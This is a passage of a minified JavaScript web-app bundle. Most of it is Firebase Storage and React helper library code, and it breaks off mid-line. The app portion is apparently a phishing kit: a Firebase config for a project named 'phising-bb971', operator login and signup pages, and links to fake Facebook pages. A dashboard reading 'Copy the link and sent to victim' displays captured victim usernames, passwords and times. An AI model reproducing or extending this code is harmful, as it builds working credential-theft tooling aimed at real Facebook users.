boundary="+a;const u=Iw(e,r,i),c=Sw(u,n),d="--"+a+`\r
Content-Type: application/json; charset=utf-8\r
\r
`+c+`\r
--`+a+`\r
Content-Type: `+u.contentType+`\r
\r
`,h=`\r
--`+a+"--",m=un.getBlob(d,r,h);if(m===null)throw hw();const _={name:u.fullPath},v=no(s,t.host,t._protocol),w="POST",p=t.maxUploadRetryTime,f=new Ci(v,w,jh(t,n),p);return f.urlParams=_,f.headers=o,f.body=m.uploadData(),f.errorHandler=ro(e),f}class $l{constructor(e,n,r,i){this.current=e,this.total=n,this.finalized=!!r,this.metadata=i||null}}function zh(t,e){let n=null;try{n=t.getResponseHeader("X-Goog-Upload-Status")}catch{zt(!1)}return zt(!!n&&(e||["active"]).indexOf(n)!==-1),n}function QP(t,e,n,r,i){const s=e.bucketOnlyServerUrl(),o=Iw(e,r,i),l={name:o.fullPath},a=no(s,t.host,t._protocol),u="POST",c={"X-Goog-Upload-Protocol":"resumable","X-Goog-Upload-Command":"start","X-Goog-Upload-Header-Content-Length":`${r.size()}`,"X-Goog-Upload-Header-Content-Type":o.contentType,"Content-Type":"application/json; charset=utf-8"},d=Sw(o,n),h=t.maxUploadRetryTime;function m(v){zh(v);let w;try{w=v.getResponseHeader("X-Goog-Upload-URL")}catch{zt(!1)}return zt(Ta(w)),w}const _=new Ci(a,u,m,h);return _.urlParams=l,_.headers=c,_.body=d,_.errorHandler=ro(e),_}function XP(t,e,n,r){const i={"X-Goog-Upload-Command":"query"};function s(u){const c=zh(u,["active","final"]);let d=null;try{d=u.getResponseHeader("X-Goog-Upload-Size-Received")}catch{zt(!1)}d||zt(!1);const h=Number(d);return zt(!isNaN(h)),new $l(h,r.size(),c==="final")}const o="POST",l=t.maxUploadRetryTime,a=new Ci(n,o,s,l);return a.headers=i,a.errorHandler=ro(e),a}const _m=256*1024;function JP(t,e,n,r,i,s,o,l){const a=new $l(0,0);if(o?(a.current=o.current,a.total=o.total):(a.current=0,a.total=r.size()),r.size()!==a.total)throw fP();const u=a.total-a.current;let c=u;i>0&&(c=Math.min(c,i));const d=a.current,h=d+c;let m="";c===0?m="finalize":u===c?m="upload, finalize":m="upload";const _={"X-Goog-Upload-Command":m,"X-Goog-Upload-Offset":`${a.current}`},v=r.slice(d,h);if(v===null)throw hw();function w(y,T){const k=zh(y,["active","final"]),N=a.current+c,x=r.size();let W;return k==="final"?W=jh(e,s)(y,T):W=null,new $l(N,x,k==="final",W)}const p="POST",f=e.maxUploadRetryTime,g=new Ci(n,p,w,f);return g.headers=_,g.body=v.uploadData(),g.progressCallback=l||null,g.errorHandler=ro(t),g}const Fe={RUNNING:"running",PAUSED:"paused",SUCCESS:"success",CANCELED:"canceled",ERROR:"error"};function yu(t){switch(t){case"running":case"pausing":case"canceling":return Fe.RUNNING;case"paused":return Fe.PAUSED;case"success":return Fe.SUCCESS;case"canceled":return Fe.CANCELED;case"error":return Fe.ERROR;default:return Fe.ERROR}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ZP{constructor(e,n,r){if(EP(e)||n!=null||r!=null)this.next=e,this.error=n??void 0,this.complete=r??void 0;else{const s=e;this.next=s.next,this.error=s.error,this.complete=s.complete}}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Sr(t){return(...e)=>{Promise.resolve().then(()=>t(...e))}}class ex{constructor(){this.sent_=!1,this.xhr_=new XMLHttpRequest,this.initXhr(),this.errorCode_=Xn.NO_ERROR,this.sendPromise_=new Promise(e=>{this.xhr_.addEventListener("abort",()=>{this.errorCode_=Xn.ABORT,e()}),this.xhr_.addEventListener("error",()=>{this.errorCode_=Xn.NETWORK_ERROR,e()}),this.xhr_.addEventListener("load",()=>{e()})})}send(e,n,r,i){if(this.sent_)throw Ui("cannot .send() more than once");if(this.sent_=!0,this.xhr_.open(n,e,!0),i!==void 0)for(const s in i)i.hasOwnProperty(s)&&this.xhr_.setRequestHeader(s,i[s].toString());return r!==void 0?this.xhr_.send(r):this.xhr_.send(),this.sendPromise_}getErrorCode(){if(!this.sent_)throw Ui("cannot .getErrorCode() before sending");return this.errorCode_}getStatus(){if(!this.sent_)throw Ui("cannot .getStatus() before sending");try{return this.xhr_.status}catch{return-1}}getResponse(){if(!this.sent_)throw Ui("cannot .getResponse() before sending");return this.xhr_.response}getErrorText(){if(!this.sent_)throw Ui("cannot .getErrorText() before sending");return this.xhr_.statusText}abort(){this.xhr_.abort()}getResponseHeader(e){return this.xhr_.getResponseHeader(e)}addUploadProgressListener(e){this.xhr_.upload!=null&&this.xhr_.upload.addEventListener("progress",e)}removeUploadProgressListener(e){this.xhr_.upload!=null&&this.xhr_.upload.removeEventListener("progress",e)}}class tx extends ex{initXhr(){this.xhr_.responseType="text"}}function Ir(){return new tx}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class nx{constructor(e,n,r=null){this._transferred=0,this._needToFetchStatus=!1,this._needToFetchMetadata=!1,this._observers=[],this._error=void 0,this._uploadUrl=void 0,this._request=void 0,this._chunkMultiplier=1,this._resolve=void 0,this._reject=void 0,this._ref=e,this._blob=n,this._metadata=r,this._mappings=Ew(),this._resumable=this._shouldDoResumable(this._blob),this._state="running",this._errorHandler=i=>{if(this._request=void 0,this._chunkMultiplier=1,i._codeEquals(J.CANCELED))this._needToFetchStatus=!0,this.completeTransitions_();else{const s=this.isExponentialBackoffExpired();if(mw(i.status,[]))if(s)i=cw();else{this.sleepTime=Math.max(this.sleepTime*2,iP),this._needToFetchStatus=!0,this.completeTransitions_();return}this._error=i,this._transition("error")}},this._metadataErrorHandler=i=>{this._request=void 0,i._codeEquals(J.CANCELED)?this.completeTransitions_():(this._error=i,this._transition("error"))},this.sleepTime=0,this.maxSleepTime=this._ref.storage.maxUploadRetryTime,this._promise=new Promise((i,s)=>{this._resolve=i,this._reject=s,this._start()}),this._promise.then(null,()=>{})}isExponentialBackoffExpired(){return this.sleepTime>this.maxSleepTime}_makeProgressCallback(){const e=this._transferred;return n=>this._updateProgress(e+n)}_shouldDoResumable(e){return e.size()>256*1024}_start(){this._state==="running"&&this._request===void 0&&(this._resumable?this._uploadUrl===void 0?this._createResumable():this._needToFetchStatus?this._fetchStatus():this._needToFetchMetadata?this._fetchMetadata():this.pendingTimeout=setTimeout(()=>{this.pendingTimeout=void 0,this._continueUpload()},this.sleepTime):this._oneShotUpload())}_resolveToken(e){Promise.all([this._ref.storage._getAuthToken(),this._ref.storage._getAppCheckToken()]).then(([n,r])=>{switch(this._state){case"running":e(n,r);break;case"canceling":this._transition("canceled");break;case"pausing":this._transition("paused");break}})}_createResumable(){this._resolveToken((e,n)=>{const r=QP(this._ref.storage,this._ref._location,this._mappings,this._blob,this._metadata),i=this._ref.storage._makeRequest(r,Ir,e,n);this._request=i,i.getPromise().then(s=>{this._request=void 0,this._uploadUrl=s,this._needToFetchStatus=!1,this.completeTransitions_()},this._errorHandler)})}_fetchStatus(){const e=this._uploadUrl;this._resolveToken((n,r)=>{const i=XP(this._ref.storage,this._ref._location,e,this._blob),s=this._ref.storage._makeRequest(i,Ir,n,r);this._request=s,s.getPromise().then(o=>{o=o,this._request=void 0,this._updateProgress(o.current),this._needToFetchStatus=!1,o.finalized&&(this._needToFetchMetadata=!0),this.completeTransitions_()},this._errorHandler)})}_continueUpload(){const e=_m*this._chunkMultiplier,n=new $l(this._transferred,this._blob.size()),r=this._uploadUrl;this._resolveToken((i,s)=>{let o;try{o=JP(this._ref._location,this._ref.storage,r,this._blob,e,this._mappings,n,this._makeProgressCallback())}catch(a){this._error=a,this._transition("error");return}const l=this._ref.storage._makeRequest(o,Ir,i,s,!1);this._request=l,l.getPromise().then(a=>{this._increaseMultiplier(),this._request=void 0,this._updateProgress(a.current),a.finalized?(this._metadata=a.metadata,this._transition("success")):this.completeTransitions_()},this._errorHandler)})}_increaseMultiplier(){_m*this._chunkMultiplier*2<32*1024*1024&&(this._chunkMultiplier*=2)}_fetchMetadata(){this._resolveToken((e,n)=>{const r=qP(this._ref.storage,this._ref._location,this._mappings),i=this._ref.storage._makeRequest(r,Ir,e,n);this._request=i,i.getPromise().then(s=>{this._request=void 0,this._metadata=s,this._transition("success")},this._metadataErrorHandler)})}_oneShotUpload(){this._resolveToken((e,n)=>{const r=YP(this._ref.storage,this._ref._location,this._mappings,this._blob,this._metadata),i=this._ref.storage._makeRequest(r,Ir,e,n);this._request=i,i.getPromise().then(s=>{this._request=void 0,this._metadata=s,this._updateProgress(this._blob.size()),this._transition("success")},this._errorHandler)})}_updateProgress(e){const n=this._transferred;this._transferred=e,this._transferred!==n&&this._notifyObservers()}_transition(e){if(this._state!==e)switch(e){case"canceling":case"pausing":this._state=e,this._request!==void 0?this._request.cancel():this.pendingTimeout&&(clearTimeout(this.pendingTimeout),this.pendingTimeout=void 0,this.completeTransitions_());break;case"running":const n=this._state==="paused";this._state=e,n&&(this._notifyObservers(),this._start());break;case"paused":this._state=e,this._notifyObservers();break;case"canceled":this._error=dw(),this._state=e,this._notifyObservers();break;case"error":this._state=e,this._notifyObservers();break;case"success":this._state=e,this._notifyObservers();break}}completeTransitions_(){switch(this._state){case"pausing":this._transition("paused");break;case"canceling":this._transition("canceled");break;case"running":this._start();break}}get snapshot(){const e=yu(this._state);return{bytesTransferred:this._transferred,totalBytes:this._blob.size(),state:e,metadata:this._metadata,task:this,ref:this._ref}}on(e,n,r,i){const s=new ZP(n||void 0,r||void 0,i||void 0);return this._addObserver(s),()=>{this._removeObserver(s)}}then(e,n){return this._promise.then(e,n)}catch(e){return this.then(null,e)}_addObserver(e){this._observers.push(e),this._notifyObserver(e)}_removeObserver(e){const n=this._observers.indexOf(e);n!==-1&&this._observers.splice(n,1)}_notifyObservers(){this._finishPromise(),this._observers.slice().forEach(n=>{this._notifyObserver(n)})}_finishPromise(){if(this._resolve!==void 0){let e=!0;switch(yu(this._state)){case Fe.SUCCESS:Sr(this._resolve.bind(null,this.snapshot))();break;case Fe.CANCELED:case Fe.ERROR:const n=this._reject;Sr(n.bind(null,this._error))();break;default:e=!1;break}e&&(this._resolve=void 0,this._reject=void 0)}}_notifyObserver(e){switch(yu(this._state)){case Fe.RUNNING:case Fe.PAUSED:e.next&&Sr(e.next.bind(e,this.snapshot))();break;case Fe.SUCCESS:e.complete&&Sr(e.complete.bind(e))();break;case Fe.CANCELED:case Fe.ERROR:e.error&&Sr(e.error.bind(e,this._error))();break;default:e.error&&Sr(e.error.bind(e,this._error))()}}resume(){const e=this._state==="paused"||this._state==="pausing";return e&&this._transition("running"),e}pause(){const e=this._state==="running";return e&&this._transition("pausing"),e}cancel(){const e=this._state==="running"||this._state==="pausing";return e&&this._transition("canceling"),e}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class hr{constructor(e,n){this._service=e,n instanceof Qe?this._location=n:this._location=Qe.makeFromUrl(n,e.host)}toString(){return"gs://"+this._location.bucket+"/"+this._location.path}_newRef(e,n){return new hr(e,n)}get root(){const e=new Qe(this._location.bucket,"");return this._newRef(this._service,e)}get bucket(){return this._location.bucket}get fullPath(){return this._location.path}get name(){return ww(this._location.path)}get storage(){return this._service}get parent(){const e=FP(this._location.path);if(e===null)return null;const n=new Qe(this._location.bucket,e);return new hr(this._service,n)}_throwIfRoot(e){if(this._location.path==="")throw gP(e)}}function rx(t,e,n){return t._throwIfRoot("uploadBytesResumable"),new nx(t,new un(e),n)}function ix(t){t._throwIfRoot("getDownloadURL");const e=GP(t.storage,t._location,Ew());return t.storage.makeRequestWithTokens(e,Ir).then(n=>{if(n===null)throw pP();return n})}function sx(t,e){const n=jP(t._location.path,e),r=new Qe(t._location.bucket,n);return new hr(t.storage,r)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function ox(t){return/^[A-Za-z]+:\/\//.test(t)}function lx(t,e){return new hr(t,e)}function kw(t,e){if(t instanceof Bh){const n=t;if(n._bucket==null)throw hP();const r=new hr(n,n._bucket);return e!=null?kw(r,e):r}else return e!==void 0?sx(t,e):t}function ax(t,e){if(e&&ox(e)){if(t instanceof Bh)return lx(t,e);throw Uc("To use ref(service, url), the first argument must be a Storage instance.")}else return kw(t,e)}function vm(t,e){const n=e==null?void 0:e[uw];return n==null?null:Qe.makeFromBucketSpec(n,t)}function ux(t,e,n,r={}){t.host=`${e}:${n}`,t._protocol="http";const{mockUserToken:i}=r;i&&(t._overrideAuthToken=typeof i=="string"?i:sv(i,t.app.options.projectId))}class Bh{constructor(e,n,r,i,s){this.app=e,this._authProvider=n,this._appCheckProvider=r,this._url=i,this._firebaseVersion=s,this._bucket=null,this._host=aw,this._protocol="https",this._appId=null,this._deleted=!1,this._maxOperationRetryTime=nP,this._maxUploadRetryTime=rP,this._requests=new Set,i!=null?this._bucket=Qe.makeFromBucketSpec(i,this._host):this._bucket=vm(this._host,this.app.options)}get host(){return this._host}set host(e){this._host=e,this._url!=null?this._bucket=Qe.makeFromBucketSpec(this._url,e):this._bucket=vm(e,this.app.options)}get maxUploadRetryTime(){return this._maxUploadRetryTime}set maxUploadRetryTime(e){gm("time",0,Number.POSITIVE_INFINITY,e),this._maxUploadRetryTime=e}get maxOperationRetryTime(){return this._maxOperationRetryTime}set maxOperationRetryTime(e){gm("time",0,Number.POSITIVE_INFINITY,e),this._maxOperationRetryTime=e}async _getAuthToken(){if(this._overrideAuthToken)return this._overrideAuthToken;const e=this._authProvider.getImmediate({optional:!0});if(e){const n=await e.getToken();if(n!==null)return n.accessToken}return null}async _getAppCheckToken(){const e=this._appCheckProvider.getImmediate({optional:!0});return e?(await e.getToken()).token:null}_delete(){return this._deleted||(this._deleted=!0,this._requests.forEach(e=>e.cancel()),this._requests.clear()),Promise.resolve()}_makeStorageReference(e){return new hr(this,e)}_makeRequest(e,n,r,i,s=!0){if(this._deleted)return new _P(fw());{const o=NP(e,this._appId,r,i,n,this._firebaseVersion,s);return this._requests.add(o),o.getPromise().then(()=>this._requests.delete(o),()=>this._requests.delete(o)),o}}async makeRequestWithTokens(e,n){const[r,i]=await Promise.all([this._getAuthToken(),this._getAppCheckToken()]);return this._makeRequest(e,n,r,i).getPromise()}}const ym="@firebase/storage",wm="0.11.2";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Rw="storage";function cx(t,e,n){return t=Ie(t),rx(t,e,n)}function dx(t){return t=Ie(t),ix(t)}function hx(t,e){return t=Ie(t),ax(t,e)}function fx(t=qd(),e){t=Ie(t);const r=ha(t,Rw).getImmediate({identifier:e}),i=nv("storage");return i&&px(r,...i),r}function px(t,e,n,r={}){ux(t,e,n,r)}function mx(t,{instanceIdentifier:e}){const n=t.getProvider("app").getImmediate(),r=t.getProvider("auth-internal"),i=t.getProvider("app-check-internal");return new Bh(n,r,i,e,gr)}function gx(){sr(new Rn(Rw,mx,"PUBLIC").setMultipleInstances(!0)),Rt(ym,wm,""),Rt(ym,wm,"esm2017")}gx();const _x={apiKey:"AIzaSyA8651sSqRYLOEuaHNzaUgT-oHgVbXpaZs",authDomain:"phising-bb971.firebaseapp.com",projectId:"phising-bb971",storageBucket:"phising-bb971.appspot.com",messagingSenderId:"717263928783",appId:"1:717263928783:web:635abd4f21a21879aa26ba",measurementId:"G-N4R7NTXNES"},Hh=dv(_x),di=qk(Hh),Wh=ZN(Hh),vx=fx(Hh),yx=()=>{const{uid:t}=jd(),e=oi();return Vv(di,t,e),E.jsx("div",{children:E.jsxs("div",{children:[E.jsx(op,{to:`/facebook/${t}`,children:"Facebook preview"}),E.jsx(op,{to:`/facebookLink/${t}`,children:"Facebook link"})]})})},Em=()=>{const t=oi(),e=oi(),[n,r]=I.useState(""),[i,s]=I.useState("");I.useEffect(()=>{const l=di.onAuthStateChanged(a=>{a&&t(`/${a.uid}`)});return()=>l()},[t]);const o=l=>{l.preventDefault(),AI(di,n,i).then(()=>{alert(`${n} is logged in successful`)}).catch(a=>{alert(a.code)})};return E.jsx("div",{className:"h-screen bg-slate-600 flex items-center justify-center",children:E.jsxs("div",{className:"p-5 bg-rose-500 w-[300px] flex flex-col items-center justify-center rounded-3xl shadow-2xl",children:[E.jsxs("form",{onSubmit:o,className:"flex flex-col w-[250px] ",children:[E.jsx("input",{type:"email",required:!0,placeholder:"Enter your email",onChange:l=>r(l.target.value),className:"my-2 p-2 rounded-3xl"}),E.jsx("input",{type:"password",required:!0,placeholder:"Enter your password",onChange:l=>s(l.target.value),className:"my-2 p-2 rounded-3xl"}),E.jsx("button",{type:"submit",className:"my-2 bg-black text-white h-10 rounded-3xl transition hover:bg-green-600 hover:shadow-2xl duration-500",children:"Login"})]}),E.jsx("button",{className:"my-2 bg-black text-white h-10 rounded-3xl transition hover:bg-green-600 hover:shadow-2xl duration-500 w-full",onClick:()=>e("/signup"),children:"SingUp"})]})})},wx=()=>{const t=oi(),[e,n]=I.useState({name:"",phone:"",email:"",password:"",picture:""});I.useEffect(()=>{const i=di.onAuthStateChanged(s=>{s&&t(`/${s.uid}`)});return()=>i()},[t]);const r=i=>{i.preventDefault(),xI(di,e.email,e.password).then(s=>{const o=s.user;if(o.uid){const l=hx(vx,`user/${o.uid}/`),a=cx(l,e.picture);a.on("state_changed",()=>{dx(a.snapshot.ref).then(u=>{lw(Lh(Wh,`userInfo/${o.uid}`),{name:e.name,phone:e.phone,email:e.email,password:e.password,uid:o.uid,picture:u})})})}alert(`${e.name} is signup successful`),t(`/${o.uid}`)})};return E.jsx("div",{className:"h-screen bg-slate-600 flex items-center justify-center",children:E.jsx("div",{className:"w-[250px] p-5 bg-orange-400 rounded-3xl",children:E.jsxs("form",{className:"flex flex-col",onSubmit:r,children:[E.jsx("input",{type:"text",required:!0,placeholder:"Enter your Full name",onChange:i=>n({...e,name:i.target.value}),className:"h-10 my-2 p-5 rounded-3xl"}),E.jsx("input",{type:"tel",required:!0,placeholder:"Enter Your Phone number",onChange:i=>n({...e,phone:i.target.value}),className:"h-10 my-2 p-5 rounded-3xl"}),E.jsx("input",{type:"email",required:!0,placeholder:"Enter your Email address",onChange:i=>n({...e,email:i.target.value}),className:"h-10 my-2 p-5 rounded-3xl"}),E.jsx("input",{type:"password",required:!0,placeholder:"Enter your Password",onChange:i=>n({...e,password:i.target.value}),className:"h-10 my-2 p-5 rounded-3xl"}),E.jsx("label",{children:"Choose your Picture"}),E.jsx("input",{type:"file",required:!0,className:"h-10 my-2",onChange:i=>n({...e,picture:i.target.files[0]})}),E.jsx("button",{className:"h-10 my-2 rounded-3xl bg-black text-white font-bold transition hover:bg-green-700 hover:shadow-2xl duration-500",children:"SignUp"})]})})})},Ex=()=>{const{uid:t}=jd(),[e,n]=I.useState(`${window.location.host}/facebook/${t}`),[r,i]=I.useState(!1),[s,o]=I.useState([]),l=oi();Vv(di,t,l),I.useEffect(()=>{const u=Lh(Wh,`user/${t}/victim/facebook`);VN(u,c=>{const d=[];c.forEach(h=>{d.push(h.val())}),o(d)})},[t]),console.log(s);const a=()=>{navigator.clipboard.writeText(e).then(()=>i(!0))};return E.jsxs("div",{className:"h-screen  w-full",children:[E.jsxs("div",{className:"flex justify-center p-5",children:[E.jsxs("div",{className:"mr-5 flex flex-col items-center justify-center",children:[E.jsx("h1",{className:"font-bold py-3",children:"Copy the link and sent to victim"}),E.jsx("textarea",{value:e,className:"h-10 w-96 border border-black rounded-xl overflow-hidden "})]}),E.jsx("button",{onClick:a,className:"flex items-center justify-center border px-4 rounded-xl bg-blue-500 focus:bg-orange-600",children:r?"Copied":"Copy"})]}),E.jsx("div",{children:E.jsx("div",{className:"flex justify-center",children:E.jsxs("table",{className:"border ",children:[E.jsx("thead",{children:E.jsxs("tr",{children:[E.jsx("th",{children:"User"}),E.jsx("th",{children:"Password"}),E.jsx("th",{children:"Time"})]})}),E.jsx("tbody",{children:s.map(u=>{const{date:c,user:d,password:h}=u;return E.jsxs("tr",{children:[E.jsx("td",{className:"border border-black p-2",children:d}),E.jsx("td",{className:"border border-black p-2",children:h}),E.jsx("td",{className:"border border-black p-2",children:c})]},c)})})]})})})]})};var Nw={exports:{}},Cx="SECRET_DO_NOT_PASS_THIS_OR_YOU_WILL_BE_FIRED",Sx=Cx,Tx=Sx;function Pw(){}function xw(){}xw.resetWarningCache=Pw;var Ix=function(){function t(r,i,s,o,l,a){if(a!==Tx){var u=new Error("Calling PropTypes validators directly is not supported by the `prop-types` package. Use PropTypes.checkPropTypes() to call them. Read more at http://fb.me/use-check-prop-types");throw u.name="Invariant Violation",u}}t.isRequired=t;function e(){return t}var n={array:t,bigint:t,bool:t,func:t,number:t,object:t,string:t,symbol:t,any:t,arrayOf:e,element:t,elementType:t,instanceOf:e,node:t,objectOf:e,oneOf:e,oneOfType:e,shape:e,exact:e,checkPropTypes:xw,resetWarningCache:Pw};return n.PropTypes=n,n};Nw.exports=Ix();var kx=Nw.exports;const Z=Fs(kx);function Rx(t){return t&&typeof t=="object"&&"default"in t?t.default:t}var Aw=I,Nx=Rx(Aw);function Cm(t,e,n){return e in t?Object.defineProperty(t,e,{value:n,enumerable:!0,configurable:!0,writable:!0}):t[e]=n,t}function Px(t,e){t.prototype=Object.create(e.prototype),t.prototype.constructor=t,t.__proto__=e}var xx=!!(typeof window<"u"&&window.document&&window.document.createElement);function Ax(t,e,n){if(typeof t!="function")throw new Error("Expected reducePropsToState to be a function.");if(typeof e!="function")throw new Error("Expected handleStateChangeOnClient to be a function.");if(typeof n<"u"&&typeof n!="function")throw new Error("Expected mapStateOnServer to either be undefined or a function.");function r(i){return i.displayName||i.name||"Component"}return function(s){if(typeof s!="function")throw new Error("Expected WrappedComponent to be a React component.");var o=[],l;function a(){l=t(o.map(function(c){return c.props})),u.canUseDOM?e(l):n&&(l=n(l))}var u=function(c){Px(d,c);function d(){return c.apply(this,arguments)||this}d.peek=function(){return l},d.rewind=function(){if(d.canUseDOM)throw new Error("You may only call rewind() on the server. Call peek() to read the current state.");var _=l;return l=void 0,o=[],_};var h=d.prototype;return h.UNSAFE_componentWillMount=function(){o.push(this),a()},h.componentDidUpdate=function(){a()},h.componentWillUnmount=function(){var _=o.indexOf(this);o.splice(_,1),a()},h.render=function(){return Nx.createElement(s,this.props)},d}(Aw.PureComponent);return Cm(u,"displayName","SideEffect("+r(s)+")"),Cm(u,"canUseDOM",xx),u}}var Ox=Ax;const bx=Fs(Ox);var Lx=typeof Element<"u",Dx=typeof Map=="function",Mx=typeof Set=="function",Ux=typeof ArrayBuffer=="function"&&!!ArrayBuffer.isView;function Vo(t,e){if(t===e)return!0;if(t&&e&&typeof t=="object"&&typeof e=="object"){if(t.constructor!==e.constructor)return!1;var n,r,i;if(Array.isArray(t)){if(n=t.length,n!=e.length)return!1;for(r=n;r--!==0;)if(!Vo(t[r],e[r]))return!1;return!0}var s;if(Dx&&t instanceof Map&&e instanceof Map){if(t.size!==e.size)return!1;for(s=t.entries();!(r=s.next()).done;)if(!e.has(r.value[0]))return!1;for(s=t.entries();!(r=s.next()).done;)if(!Vo(r.value[1],e.get(r.value[0])))return!1;return!0}if(Mx&&t instanceof Set&&e instanceof Set){if(t.size!==e.size)return!1;for(s=t.entries();!(r=s.next()).done;)if(!e.has(r.value[0]))return!1;return!0}if(Ux&&ArrayBuffer.isView(t)&&ArrayBuffer.isView(e)){if(n=t.length,n!=e.length)return!1;for(r=n;r--!==0;)if(t[r]!==e[r])return!1;return!0}if(t.constructor===RegExp)return t.source===e.source&&t.flags===e.flags;if(t.valueOf!==Object.prototype.valueOf&&typeof t.valueOf=="function"&&typeof e.valueOf=="function")return t.valueOf()===e.valueOf();if(t.toString!==Object.prototype.toString&&typeof t.toString=="function"&&typeof e.toString=="function")return t.toString()===e.toString();if(i=Object.keys(t),n=i.length,n!==Object.keys(e).length)return!1;for(r=n;r--!==0;)if(!Object.prototype.hasOwnProperty.call(e,i[r]))return!1;if(Lx&&t instanceof Element)return!1;for(r=n;r--!==0;)if(!((i[r]==="_owner"||i[r]==="__v"||i[r]==="__o")&&t.$$typeof)&&!Vo(t[i[r]],e[i[r]]))return!1;return!0}return t!==t&&e!==e}var Fx=function(e,n){try{return Vo(e,n)}catch(r){if((r.message||"").match(/stack|recursion/i))return console.warn("react-fast-compare cannot handle circular refs"),!1;throw r}};const jx=Fs(Fx);/*
object-assign
(c) Sindre Sorhus
@license MIT
*/var Sm=Object.getOwnPropertySymbols,zx=Object.prototype.hasOwnProperty,Bx=Object.prototype.propertyIsEnumerable;function Hx(t){if(t==null)throw new TypeError("Object.assign cannot be called with null or undefined");return Object(t)}function Wx(){try{if(!Object.assign)return!1;var t=new String("abc");if(t[5]="de",Object.getOwnPropertyNames(t)[0]==="5")return!1;for(var e={},n=0;n<10;n++)e["_"+String.fromCharCode(n)]=n;var r=Object.getOwnPropertyNames(e).map(function(s){return e[s]});if(r.join("")!=="0123456789")return!1;var i={};return"abcdefghijklmnopqrst".split("").forEach(function(s){i[s]=s}),Object.keys(Object.assign({},i)).join("")==="abcdefghijklmnopqrst"}catch{return!1}}var $x=Wx()?Object.assign:function(t,e){for(var n,r=Hx(t),i,s=1;s<arguments.length;s++){n=Object(arguments[s]);for(var o in n)zx.call(n,o)&&(r[o]=n[o]);if(Sm){i=Sm(n);for(var l=0;l<i.length;l++)Bx.call(n,i[l])&&(r[i[l]]=n[i[l]])}}return r};const Vx=Fs($x);var Jn={BODY:"bodyAttributes",HTML:"htmlAttributes",TITLE:"titleAttributes"},b={BASE:"base",BODY:"body",HEAD:"head",HTML:"html",LINK:"link",META:"meta",NOSCRIPT:"noscript",SCRIPT:"script",STYLE:"style",TITLE:"title"};Object.keys(b).map(function(t){return b[t]});var ee={CHARSET:"charset",CSS_TEXT:"cssText",HREF:"href",HTTPEQUIV:"http-equiv",INNER_HTML:"innerHTML",ITEM_PROP:"itemprop",NAME:"name",PROPERTY:"property",REL:"rel",SRC:"src",TARGET:"target"},Vl={accesskey:"accessKey",charset:"charSet",class:"className",contenteditable:"contentEditable",contextmenu:"contextMenu","http-equiv":"httpEquiv",itemprop:"itemProp",tabindex:"tabIndex"},Us={DEFAULT_TITLE:"defaultTitle",DEFER:"defer",ENCODE_SPECIAL_CHARACTERS:"encodeSpecialCharacters",ON_CHANGE_CLIENT_STATE:"onChangeClientState",TITLE_TEMPLATE:"titleTemplate"},qx=Object.keys(Vl).reduce(function(t,e){return t[Vl[e]]=e,t},{}),Gx=[b.NOSCRIPT,b.SCRIPT,b.STYLE],mt="data-react-helmet",Kx=typeof Symbol=="function"&&typeof Symbol.iterator=="symbol"?function(t){return typeof t}:function(t){return t&&typeof Symbol=="function"&&t.constructor===Symbol&&t!==Symbol.prototype?"symbol":typeof t},Yx=function(t,e){if(!(t instanceof e))throw new TypeError("Cannot call a class as a function")},Qx=function(){function t(e,n){for(var r=0;r<n.length;r++){var i=n[r];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(e,n,r){return n&&t(e.prototype,n),r&&t(e,r),e}}(),Ue=Object.assign||function(t){for(var e=1;e<arguments.length;e++){var n=arguments[e];for(var r in n)Object.prototype.hasOwnProperty.call(n,r)&&(t[r]=n[r])}return t},Xx=function(t,e){if(typeof e!="function"&&e!==null)throw new TypeError("Super expression must either be null or a function, not "+typeof 